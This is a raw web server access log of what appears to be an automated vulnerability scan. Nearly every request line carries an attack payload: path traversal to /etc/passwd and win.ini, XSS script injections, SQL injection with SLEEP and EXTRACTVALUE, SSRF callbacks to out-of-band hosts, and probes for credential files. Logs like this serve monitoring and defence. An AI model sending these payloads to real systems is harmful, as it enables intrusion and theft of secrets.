179.43.161.218 - - [06/Jun/2025:13:33:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_janews&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /.aws/credentials HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /config.php.tar.gz HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - ADMIN [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/themes/altair/modules/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.20.13 (KHTML, like Gecko) Version/17.7.74 Safari/616.20.13" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /themes HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /nifi-api/access/config HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_orgchart&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - demo [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /v1/submissions HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.14 (KHTML, like Gecko) Version/17.4.63 Safari/617.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/plugins/analytics-insights/tools/oauth2callback.php?state=https://oast.me/%3f&code=x HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /etc/reports/diskusage.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /loganalyzer/asktheoracle.php?type=domain&query&uid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /_sql?types HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /WAN_wan.htm?.gif HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /search?filtered=1&q=test&filter[price]=100-1331\x22><script>alert(document.cookie)</script>&filter[attr][Memory][]=16+GB HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-config.php.bk HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /install/index.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:90.0) Gecko/20100101 Firefox/90.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /select_project.php?url=http://interact.sh HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/v1/namespaces/default/pods HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /adm/krgourl.php?DOCUMENT_ROOT=http://d11vrvvlqhfdrjvik8kgsyo3kdgdg3pw1.oast.fun HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /?BazaR&vue=consulter HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /run HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /home/195WORDPRESS.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /admin/dashboard.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /lcms/index.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /webmodule-ee/login.seam HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" "-"
159.89.211.52 - manager [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.5.16" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /html/2word?url=ithhb HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 HeyTapBrowser/45.11.0.1.1 Chrome/91.0.4472.88" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /process/feries.php?fichier=../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_9) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.4 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /tests/support/stores/test_grid_filter.php?query=echo%20md5%28%22CVE-2020-19625%22%29%3B HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.18 (KHTML, like Gecko) Version/17.4 Safari/617.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /ipython/tree HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?lvl=author_see&id=42691%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.3 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/616.13.10 (KHTML, like Gecko) Version/17.2.97 Safari/616.13.10" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /swagger-ui/swagger-ui-standalone-preset.js HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /public/error.jsp?errCode=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_userstatus&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /nagiosql/admin/info.php?key1=%27%20union%20select%20concat(md5(2095492810))%23 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
159.89.211.52 - QCC [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /systemController/showOrDownByurl.do?down&dbPath=../Windows/win.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.5.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /HelpTheHelpDesk.jsdbx HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /admin/airflow/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.24" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /common/config.php.new HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php. HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /decisioncenter/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /zentao/index.php?mode=getconfig HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - admin [07/Jun/2025:08:53:28 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/experimental/latest_runs HTTP/1.1" 404 22 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cloud/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15-620" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /2yAnkq99OkhZtuvHWYeqvV7irLn.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /eam/vib?id=/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/swagger_doc.json HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /D0YIQ7.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /res/login.jsf HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1'+AND+EXTRACTVALUE(22,CONCAT(0x7e,md5(954197978)))--+X HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /document.php?modulepart=project&file=../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /docu HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-json/notificationx/v1/notification/1?api_key=0afd1aba016d54f5435932c99fe44d6b&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /.esmtprc HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /ueditor/net/controller.ashx?action=catchimage&encode=utf-8 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.7.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api?path=files&id=dfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi&revision=%22%22&type=%22thumb%22&command=url&expires=1687785968527 HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.3.26" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /api/module?type=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&live_edit=true&from_url=test HTTP/1.1" 404 22 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /__nuxt_error?stack=%0A%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?option=com_noticeboard&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-content/themes/bello/style.css HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /wp-json/wp/v2/lesson/1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /scripts/wa.exe?OK=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "OPTIONS / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356) HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.65" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /cgi-bin/luci/web HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /webacs/pages/common/login.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /upload/cbbacbc.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.18 (KHTML, like Gecko) Version/17.4 Safari/617.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /Vagrantfile HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /index.php?page=install HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.7.24" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /modules/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "GET /compress.php?file=../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/616.13.10 (KHTML, like Gecko) Version/17.2.97 Safari/616.13.10" "-"
159.89.211.52 - - [07/Jun/2025:08:53:28 +0000] "POST /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:29 +0000] "GET /;/WEB-INF/web.xml HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:29 +0000] "GET /SetupWizard.aspx HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.6.27" "-"
159.89.211.52 - - [07/Jun/2025:08:53:29 +0000] "GET /wt2parser.cgi?home_en HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:29 +0000] "GET /api/filemanager?path=%2F..%2f..%2fContent HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.6.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:29 +0000] "GET /ROOT.7z HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0" "-"
